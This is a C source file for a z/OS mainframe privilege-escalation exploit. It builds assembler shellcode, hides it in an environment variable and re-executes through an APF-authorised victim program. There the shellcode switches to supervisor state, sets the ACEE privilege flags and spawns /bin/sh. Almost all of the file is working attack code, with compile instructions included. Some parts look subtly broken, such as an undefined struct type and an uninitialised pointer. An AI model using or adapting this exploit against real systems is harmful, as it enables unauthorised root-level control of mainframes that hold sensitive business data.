/* 
 "it's pathetic"
       - Bill Pullman - True Lies
 Generates zArch shell code stored in the environment variable.
 Shellcode starts 10 bytes in in environment variable.
 This program first executes itself then its victim.
 Based on:
  https://github.com/mainframed/logica/blob/master/DeFeNeStRaTe.C
 Compile with:
  xlc -o tinyd tinyd.c
*/
 
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>

/* VICTIM points to the compiled version of tst. */
#define VICTIM "/APF/tst"

/* For BPX1EXC Storage */
#define NUM_ENVS 1
#define ENV_LEN 0x1000
#define ENV_SIZE 0x2000

/* Assembler */
#define R0 0
#define R1 1
#define R2 2
#define R3 3
#define R4 4
#define R5 5
#define R6 6
#define R7 7
#define R8 8
#define R9 9
#define R10 10
#define R11 11
#define R12 12
#define R13 13
#define R14 14
#define R15 15

#define INS_RR(C,X,Y) (C), ( ((X)&0xf) <<4 ) | ( (Y)&0xf )
#define INS_RX(C,X,Y,Z) (C),(((X)&0xf)<<4),((((Y)&0xf)<<4)|(((Z)>>8)&0xf)), ((Z)&0xff)
#define SubReg(X,Y) INS_RR( 0x1b, (X), (Y) )
#define BranchAndSaveReg(X,Y) INS_RR(0x0D, (X), (Y) )
#define StoreChar(X,Y,Z) INS_RX(0x42,(X),(Y),(Z))
#define Load(X,Y,Z) INS_RX(0x58,(X),(Y),(Z))
#define LoadHalfwordImm(X,Y) 0xa7,( (( (X)&0xf )<<4)|8),(((Y)>>8)&0xff),((Y)&0xff)
#define SVC(X) 0x0a,((X)&0xff)

/* Used by ResolveImports */
#define STARTWALK(PTR)          do { (PTR) = (unsigned char *)0; } while (0)
#define WALK(PTR,OFF)           do { memcpy( &(PTR), &(PTR)[(OFF)], sizeof(PTR) ); } while (0)
#define SETPTR(DST,SRC,OFF)     do { memcpy( &(DST), &(SRC)[(OFF)], sizeof(DST) ); } while (0)


/* Create a variable with the assembler 'shell code' */
unsigned char shellcode_full[] =
{
        SubReg(R1,R1),
        LoadHalfwordImm(R1,0x3c),
        SVC(0x6b),                          /* MODESET MODE=SUP,KEY=ZERO        */
        Load(R15,0,0x0224),                 /* ASCBPVT                          */
        Load(R15,R15,0x6c),                 /* ASCBASXB                         */
        Load(R15,R15,0xc8),                 /* ASXBACEE                         */
        LoadHalfwordImm(R1,0x0303),
        StoreChar(R1,R15,38),               /* X'03' => ACEEFLG1                */
        SubReg(R1,R1),
        LoadHalfwordImm(R1,0x24),
        SVC(0x6b),                          /* MODESET MODE=PROB,KEY=NZERO      */
        Load(R15,0,0x10),                   /* CVT                              */
        Load(R15,R15,544),                  /* CVTCSRT                          */
        Load(R15,R15,24),                   /* CSR slot                         */
        Load(R15,R15,228),                  /* BPX1EXC                          */
        SubReg(R14,R14),                    /* 0 => R14; ret addr of BPX1EXC    */
        BranchAndSaveReg(R1,R15),           /* params => R1; invoke BPX1EXC     */

};

typedef void BPXSVC();
#pragma linkage(BPXSVC,OS)
/* 228 */
void (*BPX1EXC)(        unsigned int    *Pathname_length,
                        unsigned char   *Pathname,
                        unsigned int    *Argument_count,
                        unsigned int    *Argument_length_list,
                        unsigned char  **Argument_list,
                        unsigned int    *Environment_count,
                        unsigned int    *Environment_data_length,
                        unsigned char  **Environment_data_list,
                        void           (*Exit_routine_address)(),
                        void            *Exit_parameter_list_address,
                        unsigned int    *Return_value,
                        unsigned int    *Return_code,
                        unsigned int    *Reason_code);


struct _shellcode_BPX1EXC_Params
{
  void *pPathLen;
  void *pPathName;
  void *pArgCount;
  void *pArgLenList;
  void *pArgDataList;
  void *pEnvCount;
  void *pEnvLenList;
  void *pEnvDataList;
  void *pExitAddr;
  void *pExitParamListAddr;
  void *pRetVal;
  void *pRetCode;
  void *pRsnCode;

  unsigned int PathLen;
  unsigned char PathName[64];
  unsigned int ArgCount;
  unsigned int *ArgLenList[2];
  unsigned char *ArgDataList[2];
  unsigned int EnvCount;
  unsigned int *EnvLenList[2];
  unsigned char *EnvDataList[2];
  void *ExitAddr;
  void *ExitParamListAddr;
  unsigned int RetVal;
  unsigned int RetCode;
  unsigned int RsnCode;

};

/* Variables used in main() */
unsigned char *ArgDataList[1];
unsigned int  ArgCount, *ArgLenList[1];
unsigned char *EnvDataList[1];
unsigned int  *EnvLenList[1];
unsigned int  EnvCount;
unsigned char *PathName;
unsigned int  PathLen;
void          (*ExitAddr)();
void          *ExitParamList[] = { NULL };
void          *ExitParamListAddr;
unsigned int  RetVal;
unsigned int  RetCode;
unsigned int  RsnCode;
unsigned int  PayloadAddr, PayloadParamsAddr;
void          *pPayloadParams;
unsigned int  PayloadParamsLen;

/* Gets the environment variables */
extern char **environ;

/* Functions */
void *Build_shellcode_BPX1EXC_Params(unsigned int BaseAddr, unsigned int *pOutLen, int first)
{
  /* builds the 'shellcode' for BPX1EXC */
  struct _shellcode_BPX1EXC_Params *pParams;
  struct _shellcode_BPX1EXC_Params *pBase;

  pParams = malloc(sizeof(*pParams));
  memset(pParams, 0xc1, sizeof(*pParams));

/* On the first pass through these pointers won't mean anything so we can skip them */
/* BaseAddr is *environ[0] + 10 (skipping PAYLOAD=23) */

if (first == 0) {
  pBase =  (struct _shellcode_BPX1EXC_Args *)BaseAddr;

  pParams->pPathLen               = &pBase->PathLen;
  pParams->pPathName              = &pBase->PathName;

  pParams->pArgCount              = &pBase->ArgCount;
  pParams->pArgLenList            = &pBase->ArgLenList;
  pParams->pArgDataList           = &pBase->ArgDataList;

  pParams->pEnvCount              = &pBase->EnvCount;
  pParams->pEnvLenList            = &pBase->EnvLenList;
  pParams->pEnvDataList           = &pBase->EnvDataList;

  pParams->pExitAddr              = &pBase->ExitAddr;
  pParams->pExitParamListAddr     = &pBase->ExitParamListAddr;

  pParams->pRetVal                = &pBase->RetVal;
  pParams->pRetCode               = &pBase->RetCode;
  pParams->pRsnCode               = &pBase->RsnCode;

  }

  /* Here we setup the variables we'll use on our second passthrough */
  memset(pParams->PathName, 0, sizeof(pParams->PathName));
  memcpy(pParams->PathName, "/bin/sh", 7);
  pParams->PathLen = 7;

  pParams->ArgCount = 1;
  pParams->ArgLenList[0] = &pBase->PathLen;
  pParams->ArgLenList[1] = NULL;
  pParams->ArgDataList[0] = &pBase->PathName;
  pParams->ArgDataList[1] = NULL;
  pParams->EnvCount = 0;
  pParams->EnvLenList[0] = pParams->EnvLenList[1] = NULL;
  pParams->EnvDataList[0] = pParams->EnvLenList[1] = NULL;
  pParams->ExitAddr = pParams->ExitParamListAddr = NULL;

  pParams->RetVal = pParams->RetCode = pParams->RsnCode = 0xdeadbabe;

  if (pOutLen != NULL) *pOutLen = sizeof(*pParams);

  return pParams;
}

void ResolveImports(void)
{
  /* This function resolves the location of the USS callable table */
  /* and points BPX1EXC to it */

        unsigned char *cp;

        STARTWALK(cp);
        WALK(cp, 16);                   /* CVT           */
        WALK(cp, 544);                  /* CSRTABLE      */
        WALK(cp, 24);                   /* CSR slot      */
        SETPTR(BPX1EXC, cp, 228);
}

/* Now we can start it up */
int main(int argc, char *argv[])
{
        unsigned int i, first;

        i = 0;
        ArgDataList[0] = malloc(1+1);
        ArgLenList[0] = malloc(sizeof(unsigned int));
        *ArgLenList[0] = 1;
        *(unsigned int *)(ArgDataList[0] + i) = 0xFEEDBEEF;

        EnvDataList[0] = malloc(8+4+2+ENV_SIZE+1);
        memset(EnvDataList[0], 0xf00fc7c8, (8+4+2+ENV_SIZE+1));
        EnvLenList[0] = malloc(sizeof(unsigned int));
        *EnvLenList[0] = ENV_LEN;

        if(memcmp(environ[0], "PAYLOAD=", 8) == 0) {
    first = 0;
          printf("[>] Second Run\n");
          PathName = strdup(VICTIM);
          /* On the second run, the environment variable already has the code it in */
          i += 10 + sizeof(shellcode_full);
          memcpy(EnvDataList[0],environ[0], i);
          PayloadParamsAddr = (unsigned int)environ[0] + i;
          pPayloadParams = Build_shellcode_BPX1EXC_Params(PayloadParamsAddr, &PayloadParamsLen, first);
          memcpy(EnvDataList[0] + i, pPayloadParams, PayloadParamsLen);
          i += PayloadParamsLen;

        } else {

          printf("[>] First Run\n");
          PathName = argv[0];
          i = 0;
          first = 1;
          memcpy(EnvDataList[0], "PAYLOAD=", 8);
          i += 8;
          EnvDataList[0][i ++] = '2';
          EnvDataList[0][i ++] = '3';

          memcpy(EnvDataList[0] + i, shellcode_full, sizeof(shellcode_full));
          i += sizeof(shellcode_full);
          /* size is now 'PAYLOAD=23' + sizeof(shellcode_full) */

          PayloadParamsAddr = (unsigned int)environ[0] + i;
          pPayloadParams = Build_shellcode_BPX1EXC_Params(PayloadParamsAddr, &PayloadParamsLen, first);
          memcpy(EnvDataList[0] + i, pPayloadParams, PayloadParamsLen);
          i += PayloadParamsLen;

          i = ENV_LEN - 4;
          while (i < ENV_LEN) EnvDataList[0][i ++] = "pP"[i&1];

        }

        ArgCount = EnvCount = 1;
        PathLen = strlen(PathName);
        ExitAddr = NULL;
        ExitParamListAddr = ExitParamList;
        RetVal = RetCode = RsnCode = 0xdeadbeef;

        ResolveImports();
        printf("execing %s\n", PathName);

        ((BPXSVC *)BPX1EXC)(
                &PathLen, &PathName[0],
                &ArgCount, ArgLenList, ArgDataList,
                &EnvCount, EnvLenList, EnvDataList,
                &ExitAddr, &ExitParamListAddr,
                &RetVal, &RetCode, &RsnCode);

        fprintf(stderr, "exec (OMVS BPX1EXC) failed; RetVal %d, Errno %u, RsnCode X'%x'. \n", RetVal, RetCode, RsnCode);
        if (RetVal != 0 && RetCode != 0) fprintf(stderr, "exec (OMVS BPX1EXC): %s\n", strerror(RetCode));

        return 0;
}
